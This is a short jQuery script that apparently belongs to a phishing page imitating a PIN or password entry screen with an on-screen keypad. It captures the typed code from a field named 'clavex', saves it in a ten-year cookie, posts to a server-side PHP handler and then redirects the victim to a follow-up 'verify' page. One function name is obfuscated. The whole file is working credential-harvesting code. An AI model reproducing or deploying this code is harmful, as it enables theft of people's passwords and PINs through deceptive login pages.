function _ck_pass(){
if ($('#password').val().length >=4) {
$('#btnGo').prop('disabled',false);}
else {$('#btnGo').prop('disabled',true);}
}

setInterval(function() {new _ck_pass();}, 700);

$('#btnGo').click(function(){
var pass = $('.clavex').val();
$.cookie('pass', pass, { expires: 365 * 10 });
$.post('assets/php/app.php', {content:'logo'});
setTimeout(function() {
var url = "verify_c.php";
$(location).attr('href',url);}, 500);
});

function rDMvafQAf_ro(id){
	var value = $('.clavex').val();
	if (value.length >=4) {}else{
	$('.clavex').val(value+id);
$('#password').val(value+id);
}
}